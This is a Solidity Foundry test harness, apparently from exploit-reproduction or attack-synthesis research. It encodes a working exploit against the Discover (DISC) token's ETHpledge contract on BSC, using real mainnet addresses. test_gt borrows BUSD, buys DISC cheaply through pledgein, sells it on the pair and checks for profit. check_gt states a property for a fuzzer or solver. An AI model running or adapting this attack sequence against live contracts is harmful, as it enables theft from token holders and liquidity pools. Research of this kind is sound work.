// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/Helper.sol";
import {IETHpledge} from "@interfaces/IETHpledge.sol";

contract DiscoverTestBase is Test, Helper {
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 disc = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
    IUniswapV2Pair pair =
        IUniswapV2Pair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);
    IETHpledge ethpledge =
        IETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
    address owner = address(0x8894E0a0c962CB723c1976a4421c95949bE2D4E3);
    address attacker = address(0x446247bb10B77D1BCa4D4A396E014526D1ABA277);
    uint256 balanceOfbusdattacker;
    modifier foray() {
        _;
    }

    function setUp() public {
        balanceOfbusdattacker = busd.balanceOf(attacker);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        address[] memory token_addrs = new address[](2);
        string[] memory token_names = new string[](2);
        address[] memory user_addrs = new address[](6);
        string[] memory user_names = new string[](6);
        token_addrs[0] = address(busd);
        token_names[0] = "busd";
        token_addrs[1] = address(disc);
        token_names[1] = "disc";
        user_addrs[0] = attacker;
        user_names[0] = "attacker";
        user_addrs[1] = address(busd);
        user_names[1] = "busd";
        user_addrs[2] = address(disc);
        user_names[2] = "disc";
        user_addrs[3] = address(pair);
        user_names[3] = "pair";
        user_addrs[4] = address(ethpledge);
        user_names[4] = "ethpledge";
        user_addrs[5] = owner;
        user_names[5] = "owner";
        queryERC20BalanceBatch(
            token_addrs,
            token_names,
            user_addrs,
            user_names
        );
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
    }

    function borrow_busd_pair(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(pair));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_pair(uint256 amount) internal foray {
        busd.transfer(address(pair), amount);
    }

    function borrow_disc_pair(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(pair));
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_disc_pair(uint256 amount) internal foray {
        disc.transfer(address(pair), amount);
    }

    function borrow_busd_owner(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(owner));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal foray {
        busd.transfer(address(owner), amount);
    }

    function borrow_disc_owner(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(owner));
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_disc_owner(uint256 amount) internal foray {
        disc.transfer(address(owner), amount);
    }

    function swap_pair_attacker_busd_disc(
        uint256 amount,
        uint256 amountOut
    ) internal foray {
        busd.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_disc_busd(
        uint256 amount,
        uint256 amountOut
    ) internal foray {
        disc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_ethpledge_attacker_busd_disc(
        uint256 amount,
        uint256 amountOut
    ) internal foray {
        address attacker1 = address(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930);
        busd.approve(address(ethpledge), type(uint256).max);
        ethpledge.pledgein(attacker1, amount);
        vm.stopPrank();
        vm.startPrank(attacker1);
        disc.transfer(attacker, disc.balanceOf(attacker1));
        vm.stopPrank();
        vm.startPrank(attacker);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_busd_owner(19811e18);
        printBalance("After step0 ");
        swap_ethpledge_attacker_busd_disc(2000e18, 1);
        printBalance("After step1 ");
        swap_pair_attacker_disc_busd(
            disc.balanceOf(attacker),
            (getAmountOut(
                address(pair),
                disc.balanceOf(attacker),
                address(disc)
            ) * 9) / 10
        );
        printBalance("After step2 ");
        payback_busd_owner((19811e18 * 1003) / 1000);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_busd_owner(amt0);
        swap_ethpledge_attacker_busd_disc(amt1, amt2);
        swap_pair_attacker_disc_busd(amt3, amt4);
        payback_busd_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
